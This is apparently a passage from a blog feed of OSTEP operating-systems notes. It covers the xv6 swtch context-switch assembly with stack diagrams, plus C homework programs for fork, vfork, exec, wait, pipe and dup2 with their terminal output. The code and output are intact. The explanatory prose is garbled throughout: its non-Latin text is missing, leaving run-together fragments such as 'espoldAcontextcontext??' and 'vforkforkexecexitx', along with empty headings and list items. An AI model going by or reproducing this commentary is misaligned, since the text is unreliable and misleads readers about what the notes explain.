class="line">oldA</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|      ret(A)  |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+4</span></span><br><span class="line">|     old(*)   | </span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+8</span></span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code>movl 4(%esp), %eax</code>old(*)eax</p><p><code>popl 0(%eax)eipold-&gt;eip</code></p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldA</span><br><span class="line">+--------------+ </span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|     old(*)   | </span><br><span class="line">+--------------+</span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code>movl %ebp, 28(%eax)</code>oldcontext</p><p><code>movl 4(%esp), %eax</code>contexteax</p><p><code>movl 4(%eax), %esp</code>context</p><p>ebpespB</p><p><code> pushl 0(%eax)  # %eip</code>newb-&gt;eip</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">NewB</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|      ret(B)  |</span><br><span class="line">+--------------+ </span><br><span class="line">|              | </span><br><span class="line">+--------------+ </span><br><span class="line">|              |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>swtch</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//PAGEBREAK: 17</span></span><br><span class="line"><span class="comment">// Saved registers for kernel context switches.</span></span><br><span class="line"><span class="comment">// Don&#x27;t need to save all the segment registers (%cs, etc),</span></span><br><span class="line"><span class="comment">// because they are constant across kernel contexts.</span></span><br><span class="line"><span class="comment">// Don&#x27;t need to save %eax, %ecx, %edx, because the</span></span><br><span class="line"><span class="comment">// x86 convention is that the caller has saved them.</span></span><br><span class="line"><span class="comment">// Contexts are stored at the bottom of the stack they</span></span><br><span class="line"><span class="comment">// describe; the stack pointer is the address of the context.</span></span><br><span class="line"><span class="comment">// The layout of the context matches the layout of the stack in swtch.S</span></span><br><span class="line"><span class="comment">// at the &quot;Switch stacks&quot; comment. Switch doesn&#x27;t save eip explicitly,</span></span><br><span class="line"><span class="comment">// but it is on the stack and allocproc() manipulates it.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  uint edi;</span><br><span class="line">  uint esi;</span><br><span class="line">  uint ebx;</span><br><span class="line">  uint ebp;</span><br><span class="line">  uint eip;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># Context <span class="keyword">switch</span></span><br><span class="line">#</span><br><span class="line"><span class="meta">#   void swtch(struct context **old, struct context *new);</span></span><br><span class="line"># </span><br><span class="line"># Save the current registers on the <span class="built_in">stack</span>, creating</span><br><span class="line"><span class="meta"># a struct context, and save its address in *old.</span></span><br><span class="line"># Switch stacks to new and pop previously-saved registers.</span><br><span class="line"></span><br><span class="line">.globl swtch</span><br><span class="line">swtch:</span><br><span class="line">  movl <span class="number">4</span>(%esp), %eax</span><br><span class="line">  movl <span class="number">8</span>(%esp), %edx</span><br><span class="line"></span><br><span class="line">  # Save old callee-saved registers</span><br><span class="line">  pushl %ebp</span><br><span class="line">  pushl %ebx</span><br><span class="line">  pushl %esi</span><br><span class="line">  pushl %edi</span><br><span class="line"></span><br><span class="line">  # Switch stacks</span><br><span class="line">  movl %esp, (%eax)</span><br><span class="line">  movl %edx, %esp</span><br><span class="line"></span><br><span class="line">  # Load new callee-saved registers</span><br><span class="line">  popl %edi</span><br><span class="line">  popl %esi</span><br><span class="line">  popl %ebx</span><br><span class="line">  popl %ebp</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldA</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|      ret(A)  |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+4</span></span><br><span class="line">|     old(**)  | </span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+8</span></span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code> movl 4(%esp), %eax   movl 8(%esp), %edx</code></p><p>old(**)eax</p><p>new(*)edx</p><p>context push</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldA</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+&lt;-- <span class="comment">%esp</span></span><br><span class="line">|      <span class="comment">%edi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%esi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebx    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebp       |</span></span><br><span class="line">+--------------+ </span><br><span class="line">|      ret(A)  |</span><br><span class="line">+--------------+ &lt;--<span class="comment">%eax</span></span><br><span class="line">|     old(**)  | </span><br><span class="line">+--------------+ &lt;--<span class="comment">%edx</span></span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code>  movl %esp, (%eax)</code></p><p>espoldAcontextcontext??</p><p><code>movl %edx, %esp</code></p><p>NewB,Bcontext</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">NewB</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+&lt;-- <span class="comment">%esp</span></span><br><span class="line">|      <span class="comment">%edi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%esi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebx    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebp       |</span></span><br><span class="line">+--------------+ </span><br><span class="line">|      ret(B)  |</span><br><span class="line">+--------------+ </span><br></pre></td></tr></table></figure><p>popretB</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>?</p><p>?</p><p>?</p>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:5 Process API Homework</title>
      <link href="/2023/04/12/OSTEP-homework-5-Process-API/"/>
      <url>/2023/04/12/OSTEP-homework-5-Process-API/</url>
      
        <content type="html"><![CDATA[<h2 id="Process-API-Homework"><a href="#Process-API-Homework" class="headerlink" title="Process API Homework"></a>Process API Homework</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC=gcc</span><br><span class="line">GCCFLAGS= -g -Wall</span><br><span class="line">TARGET = <span class="variable">$(<span class="built_in">word</span> 1,<span class="variable">$(MAKECMDGOALS)</span>)</span></span><br><span class="line">SRC=<span class="variable">$(<span class="built_in">word</span> 1,<span class="variable">$(MAKECMDGOALS)</span>)</span>.c</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(SRC)</span></span><br><span class="line">    <span class="variable">$(CC)</span> <span class="variable">$(GCCFLAGS)</span> <span class="variable">$(SRC)</span> -o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure><ol><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line">    x = <span class="number">2</span>;</span><br><span class="line">    <span class="type">pid_t</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fork %d\n&quot;</span>, x);</span><br><span class="line">        x = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fork %d\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 1</span><br><span class="line">gcc -g -Wall 1.c -o 1</span><br><span class="line">1.c: In function main:</span><br><span class="line">1.c:20:9: warning: implicit declaration of function wait [-Wimplicit-function-declaration]</span><br><span class="line">         wait(NULL);</span><br><span class="line">         ^</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./1</span><br><span class="line">1</span><br><span class="line">fork 2</span><br><span class="line">fork 3</span><br><span class="line">2</span><br></pre></td></tr></table></figure><blockquote><p></p></blockquote><ol start="2"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">// #define NDEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./flag&quot;</span>,O_RDWR|O_APPEND);</span><br><span class="line">    assert(<span class="number">-1</span> != fd);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span>==pid)&#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        read(fd, buf, <span class="keyword">sizeof</span>(<span class="type">char</span>) * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child:%s\n&quot;</span>, buf);</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, <span class="string">&quot;child&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;child&quot;</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> err = write(fd, buf, <span class="built_in">strlen</span>(buf) * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">            assert(err);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        read(fd, buf, <span class="keyword">sizeof</span>(<span class="type">char</span>) * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent:%s\n&quot;</span>, buf);</span><br><span class="line">        <span class="comment">// usleep(100);</span></span><br><span class="line">        <span class="built_in">memcpy</span>(buf, <span class="string">&quot;parent&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;parent&quot;</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> err = write(fd, buf, <span class="built_in">strlen</span>(buf) * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">            assert(err);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; cat flag</span><br><span class="line">1111111111xxxxxxxxxxx</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./2</span><br><span class="line">parent:1111111111</span><br><span class="line">child:xxxxxxxxxx</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; cat flag</span><br><span class="line">1111111111xxxxxxxxxxx</span><br><span class="line">parent1111parent1111childxxxxxchildxxxxxparent1111parent1111childxxxxxchildxxxxxparent1111parent1111childxxxxxparent1111parent1111childxxxxxchildxxxxxparent1111parent1111childxxxxxchildxxxxxchildxxxxx                  </span><br></pre></td></tr></table></figure><blockquote><p>xxxxx<code>    lseek(fd, 0, SEEK_SET);</code></p><p>fd</p></blockquote><ol start="3"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> pid = vfork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid) &#123;</span><br><span class="line">        x = <span class="number">66</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello  &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;world-----&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 3</span><br><span class="line">gcc -g -Wall 3.c -o 3</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./3</span><br><span class="line">hello  world-----66    </span><br></pre></td></tr></table></figure><blockquote><p>vforkforkexecexitx</p></blockquote><ol start="4"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="type">char</span>* cmd = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* name = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* arg[] = &#123; <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-a&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// execl(cmd, &quot;ls&quot;, &quot;-a&quot;, &quot;-l&quot;, &quot;-h&quot;, NULL);</span></span><br><span class="line">        execlp(name, <span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-a&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;-h&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// execve(cmd, arg, envp);</span></span><br><span class="line">        <span class="comment">// execv(cmd, arg);</span></span><br><span class="line">        <span class="comment">// execvp(name, arg);</span></span><br><span class="line">        <span class="comment">// execle(cmd, &quot;ls&quot;, NULL, envp);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>exec</p><ul><li>l(list),<code>execl(&quot;/bin/ls&quot;, &quot;ls&quot;, &quot;-a&quot;, &quot;-l&quot;, &quot;-h&quot;, NULL);</code>lsls</li><li>v(vector)  NULL</li><li>p(path) PATH,</li><li>e(environment) envpe</li></ul></blockquote><ol start="5"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid = vfork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;gr&quot;</span>);</span><br><span class="line">        <span class="type">int</span> rs = wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, rs);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> rs = wait(<span class="literal">NULL</span>);</span><br><span class="line">        assert(pid == rs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rxer@grxer /m/h/S/O/o/cpu-api&gt; make 5</span><br><span class="line">gcc -g -Wall 5.c -o 5</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./5</span><br><span class="line">gr</span><br><span class="line">-1</span><br></pre></td></tr></table></figure><blockquote><p>waitid-1-1</p></blockquote><ol start="6"><li></li></ol><blockquote><p><code>waitpid(pid,NULL,WNOHANG)</code></p></blockquote><ol start="7"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child hello&quot;</span>);</span><br><span class="line">        close(STDOUT_FILENO);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;grxer&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent : hello&quot;</span>);</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; world\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 7</span><br><span class="line">gcc -g -Wall 7.c -o 7</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./7</span><br><span class="line">parent : hello world</span><br></pre></td></tr></table></figure><blockquote><p></p></blockquote><ol start="8"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pid_t</span> pid[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> pidfd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> res = pipe(pidfd);</span><br><span class="line">    assert(<span class="number">0</span> == res);</span><br><span class="line">    pid[<span class="number">0</span>] = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid[<span class="number">0</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fork1 fail&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid[<span class="number">0</span>]) &#123;</span><br><span class="line">        close(pidfd[<span class="number">0</span>]);<span class="comment">//read</span></span><br><span class="line">        assert(dup2(pidfd[<span class="number">1</span>], STDOUT_FILENO) == STDOUT_FILENO);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;i am from pid[0]&quot;</span>);</span><br><span class="line">        close(pidfd[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        pid[<span class="number">1</span>] = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid[<span class="number">1</span>] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork2 fail&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="type">char</span> buf[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            close(pidfd[<span class="number">1</span>]);<span class="comment">//write</span></span><br><span class="line">            assert(dup2(pidfd[<span class="number">0</span>], STDIN_FILENO) == STDIN_FILENO);</span><br><span class="line">            read(STDIN_FILENO,buf,<span class="number">30</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;pid[1]:where are you from??\n %s&quot;</span>,buf);</span><br><span class="line">            close(pidfd[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            waitpid(pid[<span class="number">0</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">            waitpid(pid[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 8</span><br><span class="line">gcc -g -Wall 8.c -o 8</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./8</span><br><span class="line">pid[1]:where are you from??</span><br><span class="line"> i am from pid[0]      </span><br></pre></td></tr></table></figure><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span> pipefd[<span class="number">2</span>])</span>;</span><br><span class="line"><span class="number">0</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure><p></p><p>pipepipefdpipefd[0]pipefd[1]</p><p></p><p><img src="/2023/04/12/OSTEP-homework-5-Process-API/webp.webp" alt="img"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dup</span><span class="params">(<span class="type">int</span> oldfd)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dup2</span><span class="params">(<span class="type">int</span> oldfd, <span class="type">int</span> newfd)</span>;</span><br><span class="line">On success, these system calls <span class="keyword">return</span> the new descriptor.  On error, <span class="number">-1</span></span><br><span class="line">is returned, and errno is <span class="built_in">set</span> appropriately.</span><br></pre></td></tr></table></figure><p>dupoldfd()</p><p>dup2 dupnewfdnewfd</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:5 Process API</title>
      <link href="/2023/04/11/OSTEP-5-Process-API/"/>
      <url>/2023/04/11/OSTEP-5-Process-API/</url>
      
